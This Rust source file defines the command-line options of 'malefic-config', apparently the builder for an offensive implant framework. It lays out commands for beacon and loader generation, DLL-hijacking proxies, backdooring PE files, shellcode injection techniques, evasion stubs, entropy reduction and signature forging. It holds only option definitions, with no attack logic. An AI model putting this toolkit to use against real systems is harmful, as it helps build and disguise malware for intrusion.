use std::str::FromStr;

use crate::config::{GenerateArch, Version};
use crate::Platform;
use clap::{Parser, Subcommand};
use strum_macros::Display;

#[derive(Parser)]
#[command(name = "malefic-config", about = "Config malefic beacon and prelude.")]
pub struct Cli {
    /// Enable debug-level logging (verbose output)
    #[arg(long, global = true)]
    pub debug: bool,

    #[command(subcommand)]
    pub(crate) command: Commands,
}

#[derive(Subcommand)]
pub enum Commands {
    /// auto generate config
    Generate {
        /// Choice professional or community
        #[arg(long, short = 'v', global = true, default_value = "community")]
        version: Version,

        /// Config file path
        #[arg(long, short = 'c', global = true, default_value = "implant.yaml")]
        config: String,

        /// Choice use source code or prebuild
        #[arg(long, short = 's', global = true, default_value = "false")]
        source: bool,

        /// Use patch-friendly config blocks (disable obfstr, keep XOR blocks for binary patch)
        #[arg(long, global = true, default_value = "false")]
        patch_mode: bool,

        /// Directory containing metadata wordlist files for random generation (e.g. company_name.txt)
        #[arg(long, global = true)]
        metadata_wordlist: Option<String>,

        #[command(subcommand)]
        command: GenerateCommands,
    },

    /// auto build
    Build {
        /// Config file path
        #[arg(long, short = 'c', global = true, default_value = "implant.yaml")]
        config: String,

        #[arg(
            long,
            short = 't',
            global = true,
            default_value = "x86_64-pc-windows-gnu"
        )]
        target: String,

        /// Build as shared library (dll/so/dylib) instead of executable
        #[arg(long, default_value_t = false)]
        lib: bool,

        /// Build with the dev profile instead of release
        #[arg(long, default_value_t = false)]
        dev: bool,

        #[command(subcommand)]
        command: BuildCommands,
    },

    #[command(subcommand)]
    Tool(Tool),
}

// Configuration commands
#[derive(Subcommand)]
pub enum GenerateCommands {
    /// Config beacon
    Beacon,

    /// Config bind
    Bind,

    /// Config prelude
    Prelude {
        #[arg(default_value = "prelude.yaml")]
        yaml_path: String,

        /// Custom resources dir, default "./resources/"
        #[arg(long, default_value = "resources")]
        resources: String,

        #[arg(long, default_value = "maliceofinternal")]
        key: String,

        /// Custom spite.bin output path
        #[arg(long, default_value = "spite.bin")]
        spite: String,
    },

    /// Config modules
    Modules {
        /// Choice modules
        #[arg(long, short = 'm', default_value = "")]
        module: String,
    },

    /// Loader generation (template / proxydll / patch)
    #[command(name = "loader")]
    Loader {
        #[command(subcommand)]
        command: LoaderCommands,
    },

    /// Generate pulse
    Pulse {
        /// Choice arch x86/x64
        #[arg(long, short = 'a', default_value = "x64")]
        arch: GenerateArch,

        /// platform, win
        #[arg(long, short = 'p', default_value = "win")]
        platform: Platform,
    },
}

#[derive(Clone, Display)]
pub enum SrdiType {
    LINK,
    MALEFIC,
}

impl FromStr for SrdiType {
    type Err = String;

    fn from_str(s: &str) -> Result<Self, Self::Err> {
        match s.to_lowercase().as_str() {
            "link" => Ok(SrdiType::LINK),
            "malefic" => Ok(SrdiType::MALEFIC),
            _ => Err(format!("'{}' is not a valid value for SrdiType", s)),
        }
    }
}

#[derive(Clone, Display)]
pub enum PayloadType {
    #[strum(serialize = "malefic-pulse")]
    PULSE,
    #[strum(serialize = "malefic")]
    MALEFIC,
    #[strum(serialize = "malefic-prelude")]
    PRELUDE,
    #[strum(serialize = "malefic-modules")]
    MODULES,
    #[strum(serialize = "malefic-3rd")]
    THIRD,
    #[strum(serialize = "malefic-proxydll")]
    PROXYDLL,
}

#[derive(Subcommand)]
pub enum BuildCommands {
    /// Build beacon
    Malefic,

    /// Build prelude
    Prelude,

    /// Build modules
    Modules {
        /// custom module, e.g.: --module exec,whoami
        #[arg(long, short = 'm', default_value = "")]
        module: String,
    },

    /// build 3rd modules、
    #[command(name = "3rd")]
    Modules3rd {
        /// custom 3rd module, e.g. --3rd-module rem,curl
        #[arg(long, short = 'm', default_value = "")]
        module: String,
    },

    /// Build pulse
    Pulse {
        /// Output as raw shellcode (.bin) via objcopy
        #[arg(long, default_value_t = false)]
        shellcode: bool,
    },

    /// Build proxy-dll
    #[command(name = "proxy-dll")]
    ProxyDll,
}

#[derive(Subcommand)]
pub enum LoaderCommands {
    /// Build template loader
    #[command(name = "template")]
    Template {
        /// Template name (or "random" for random selection)
        #[arg(long, short = 't', default_value = "random")]
        template: String,

        /// List available templates
        #[arg(long, short = 'l')]
        list: bool,

        /// Input payload file to embed in the loader
        #[arg(long, short = 'i')]
        input: Option<String>,

        /// Encoding method for payload (xor, uuid, mac, ipv4, base64, base45, base58, aes, aes2, des, chacha, rc4)
        #[arg(long, short = 'e')]
        encoding: Option<String>,

        /// Enable debug output in loader
        #[arg(long)]
        debug: bool,
    },

    /// Generate ProxyDLL for DLL hijacking
    #[command(name = "proxydll")]
    ProxyDll {
        /// Raw DLL path (for parsing exports). If not specified, reads from config file.
        #[arg(long, short = 'r', default_value = "")]
        raw_dll: String,

        /// Proxied DLL path (runtime forwarding target). If not specified, reads from config file.
        #[arg(long, short = 'p', default_value = "")]
        proxied_dll: String,

        /// Proxy DLL name (generated proxy DLL name). Optional, defaults to proxied DLL's filename.
        #[arg(long, short = 'o')]
        proxy_dll: Option<String>,

        /// Comma-separated exports to hijack for payload execution
        #[arg(long, short = 'e', default_value = "")]
        hijacked_exports: String,

        /// Use NtCreateThreadEx instead of std::thread
        #[arg(long)]
        native_thread: bool,

        #[arg(long)]
        hijack_dll_main: bool,
    },

    /// Patch PE binary with shellcode (BDF - Backdoor Factory)
    #[command(name = "patch")]
    Patch {
        /// Target PE binary to backdoor
        #[arg(long, short = 'f')]
        file: String,

        /// Shellcode file to inject
        #[arg(long, short = 'i')]
        input: Option<String>,

        /// Output file path
        #[arg(long, short = 'o')]
        output: Option<String>,

        /// Only find and list code caves (no patching)
        #[arg(long)]
        find_caves: bool,

        /// Force add new section instead of using code cave
        #[arg(long)]
        add_section: bool,

        /// Section name for new section
        #[arg(long, default_value = ".sdata")]
        section_name: String,

        /// Minimum code cave size in bytes
        #[arg(long, default_value_t = 380)]
        min_cave: usize,

        /// Do NOT disable ASLR (default: ASLR is disabled for hardcoded addresses)
        #[arg(long)]
        no_disable_aslr: bool,

        /// Do NOT zero certificate table (default: cert table is zeroed)
        #[arg(long)]
        no_zero_cert: bool,

        /// Wait for shellcode thread before jumping to original EP
        /// "none" = no wait (default), "wait" = WaitForSingleObject(INFINITE), "sleep:N" = Sleep N seconds
        #[arg(long, default_value = "none")]
        wait: String,

        /// Execution technique for shellcode loading
        /// Available: direct, create_thread (default), fiber, apc, enum_fonts, enum_locales, threadpool, nt_create_thread
        #[arg(long, short = 't', default_value = "create_thread")]
        technique: String,

        /// Stub hash algorithm: ror13 (default), djb2, fnv1a
        #[arg(long, default_value = "ror13")]
        stub_hash: String,

        /// Enable polymorphic stub generation
        #[arg(long)]
        stub_poly: bool,

        /// Enable stub self-encryption (XOR decrypt wrapper)
        #[arg(long)]
        stub_encrypt: bool,

        /// Evasion preset: none (default), basic, poly, full
        /// Overrides individual --stub-* flags when not "none"
        #[arg(long, default_value = "none")]
        evasion: String,

        /// RNG seed for reproducible polymorphic output (0 = random)
        #[arg(long, default_value_t = 0)]
        seed: u64,
    },
}

#[derive(Subcommand)]
pub enum WatermarkCommands {
    /// Write watermark into a PE file
    Write {
        /// Input PE file
        #[arg(short = 'i', long)]
        input: String,
        /// Output PE file
        #[arg(short = 'o', long)]
        output: String,
        /// Watermark method: checksum, dosstub, section, overlay
        #[arg(short = 'm', long)]
        method: String,
        /// Watermark data (string)
        #[arg(short = 'w', long)]
        watermark: String,
    },
    /// Read watermark from a PE file
    Read {
        /// Input PE file
        #[arg(short = 'i', long)]
        input: String,
        /// Watermark method: checksum, dosstub, section, overlay
        #[arg(short = 'm', long)]
        method: String,
        /// Size hint for reading (bytes, used by dosstub/overlay)
        #[arg(short = 's', long)]
        size: Option<usize>,
    },
}

#[derive(Subcommand)]
pub enum BinderCommands {
    /// Bind a secondary PE onto a primary PE
    Bind {
        /// Primary PE file (carrier)
        #[arg(short = 'p', long)]
        primary: String,
        /// Secondary PE file (payload to embed)
        #[arg(short = 's', long)]
        secondary: String,
        /// Output file path
        #[arg(short = 'o', long)]
        output: String,
    },
    /// Extract embedded secondary PE from a bound file
    Extract {
        /// Bound PE file
        #[arg(short = 'i', long)]
        input: String,
        /// Output file for extracted payload
        #[arg(short = 'o', long)]
        output: String,
    },
    /// Check if a file contains embedded payload
    Check {
        /// Input file to check
        #[arg(short = 'i', long)]
        input: String,
    },
}

#[derive(Subcommand)]
pub enum IconCommands {
    /// Replace icon in a PE file
    Replace {
        /// Input PE file
        #[arg(short = 'i', long)]
        input: String,
        /// ICO file to use as replacement
        #[arg(long)]
        ico: String,
        /// Output PE file
        #[arg(short = 'o', long)]
        output: String,
    },
    /// Extract icon from a PE file to ICO
    Extract {
        /// Input PE file
        #[arg(short = 'i', long)]
        input: String,
        /// Output ICO file
        #[arg(short = 'o', long)]
        output: String,
    },
}

#[derive(Subcommand)]
pub enum Tool {
    // /// Generate calc shellcode
    // Calc {
    //     /// choice platform,
    //     platform: String,
    //     /// choice arch x86/x64
    //     arch: String,
    // },
    //
    // /// Generate reverse shell shellcode
    // ReverseShell {
    //     /// choice platform,
    //     platform: String,
    //     /// choice arch x86/x64
    //     arch: String,
    //     /// choice type
    //     #[arg(long, default_value = "tcp")]
    //     r#type: String,
    //     /// choice ip
    //     ip: String,
    //     /// choice port
    //     port: String,
    // },
    /// Generate SRDI
    SRDI {
        /// Srdi type: link(not support TLS)/malefic(support TLS)
        #[arg(long, short = 't', default_value = "malefic")]
        r#type: SrdiType,

        /// Source exec path
        #[arg(long, short = 'i', default_value = "")]
        input: String,

        /// platform, win
        #[arg(long, short = 'p', default_value = "win")]
        platform: Platform,

        /// Choice arch x86/x64
        #[arg(long, short = 'a', default_value = "x64")]
        arch: GenerateArch,

        /// Target shellcode path
        #[arg(long, short = 'o', default_value = "malefic.bin")]
        output: String,

        /// Function name
        #[arg(long, default_value = "")]
        function_name: String,

        /// User data path
        #[arg(long, default_value = "")]
        userdata_path: String,
    },

    /// Strip paths from binary files
    STRIP {
        /// Source binary file path
        #[arg(long, short = 'i')]
        input: String,

        /// Output binary file path
        #[arg(long, short = 'o')]
        output: String,

        /// Additional custom paths to replace (comma separated)
        #[arg(long, default_value = "")]
        custom_paths: String,
    },

    /// Object copy utility (similar to objcopy)
    #[command(name = "objcopy")]
    OBJCOPY {
        /// Output format (binary for -O binary)
        #[arg(short = 'O')]
        output_format: String,

        /// Input file path
        input: String,

        /// Output file path
        output: String,
    },

    /// Patch compiled binaries (NAME / KEY / SERVER address)
    #[command(name = "patch")]
    Patch {
        /// Target binary file (e.g. malefic.exe)
        #[arg(long, short = 'f')]
        file: String,

        /// New NAME value (beacon name)
        #[arg(long)]
        name: Option<String>,

        /// New KEY value (encryption key)
        #[arg(long)]
        key: Option<String>,

        /// New server address (e.g. 192.168.1.100:5001)
        #[arg(long)]
        server_address: Option<String>,

        /// Output file path (defaults to <file>.patched)
        #[arg(long, short = 'o')]
        output: Option<String>,

        /// Override XOR key (defaults to basic.key from implant.yaml)
        #[arg(long = "xor-key")]
        xor_key: Option<String>,
    },

    /// Patch runtime config blob (CFGv3B64 prefix + fixed payload)
    #[command(name = "patch-config")]
    PatchConfig {
        /// Target binary file (e.g. malefic.exe)
        #[arg(long, short = 'f')]
        file: String,

        /// Runtime config file (json/yaml) matching RuntimeConfig
        #[arg(long, short = 'c')]
        config: Option<String>,

        /// Generate from implant.yaml instead of raw RuntimeConfig
        #[arg(long = "from-implant")]
        from_implant: Option<String>,

        /// Pre-encoded blob string (length must equal CONFIG_BLOB_B64_LEN)
        #[arg(long)]
        blob: Option<String>,

        /// Output file path (defaults to <file>.patched)
        #[arg(long, short = 'o')]
        output: Option<String>,
    },

    /// Payload encoding tool (T1132)
    #[command(name = "encode")]
    Encode {
        /// Input binary file
        #[arg(long, short = 'i')]
        input: Option<String>,

        /// Encoding method (xor, uuid, mac, ipv4, base64, base45, base58, aes, aes2, des, chacha, rc4)
        #[arg(long, short = 'e', default_value = "xor")]
        encoding: String,

        /// Output file path
        #[arg(long, short = 'o')]
        output: Option<String>,

        /// Output format: bin, c, rust, all
        #[arg(long, short = 'f', default_value = "bin")]
        format: String,

        /// List available encodings
        #[arg(long, short = 'l')]
        list: bool,
    },

    /// Measure and reduce Shannon entropy of PE files
    #[command(name = "entropy")]
    Entropy {
        /// Input PE file
        #[arg(short = 'i', long)]
        input: String,
        /// Output file path (not used with --measure-only)
        #[arg(short = 'o', long)]
        output: Option<String>,
        /// Target entropy threshold (default 6.0)
        #[arg(short = 't', long, default_value = "6.0")]
        threshold: f64,
        /// Reduction strategy: null_bytes, pokemon, random_words
        #[arg(short = 's', long, default_value = "null_bytes")]
        strategy: String,
        /// Maximum file growth multiplier (default 5.0x)
        #[arg(long, default_value = "5.0")]
        max_growth: f64,
        /// Only measure entropy, do not modify
        #[arg(long)]
        measure_only: bool,
    },

    /// PE file watermark embedding and reading
    #[command(name = "watermark")]
    Watermark {
        #[command(subcommand)]
        command: WatermarkCommands,
    },

    /// Bind/embed a secondary PE into a primary PE
    #[command(name = "binder")]
    Binder {
        #[command(subcommand)]
        command: BinderCommands,
    },

    /// PE file signature manipulation tool
    #[command(name = "sigforge")]
    SigForge {
        #[command(subcommand)]
        command: SigForgeCommands,
    },

    /// Replace or extract icons in PE files
    #[command(name = "icon")]
    Icon {
        #[command(subcommand)]
        command: IconCommands,
    },
}

#[derive(Subcommand)]
pub enum SigForgeCommands {
    /// Extract signature from a signed PE file
    Extract {
        #[arg(short = 'i', long)]
        input: String,
        #[arg(short = 'o', long)]
        output: Option<String>,
    },
    /// Copy signature from one PE file to another
    Copy {
        #[arg(short = 's', long)]
        source: String,
        #[arg(short = 't', long)]
        target: String,
        #[arg(short = 'o', long)]
        output: Option<String>,
    },
    /// Inject signature from file into PE file
    Inject {
        #[arg(short = 's', long)]
        signature: String,
        #[arg(short = 't', long)]
        target: String,
        #[arg(short = 'o', long)]
        output: Option<String>,
    },
    /// Remove signature from PE file
    Remove {
        #[arg(short = 'i', long)]
        input: String,
        #[arg(short = 'o', long)]
        output: Option<String>,
    },
    /// Check if a PE file is signed
    Check {
        #[arg(short = 'i', long)]
        input: String,
    },
    /// Clone a TLS certificate from a remote host and inject into PE
    CarbonCopy {
        #[arg(long)]
        host: Option<String>,
        #[arg(long, default_value = "443")]
        port: u16,
        #[arg(long)]
        cert_file: Option<String>,
        #[arg(short = 't', long)]
        target: String,
        #[arg(short = 'o', long)]
        output: Option<String>,
    },
}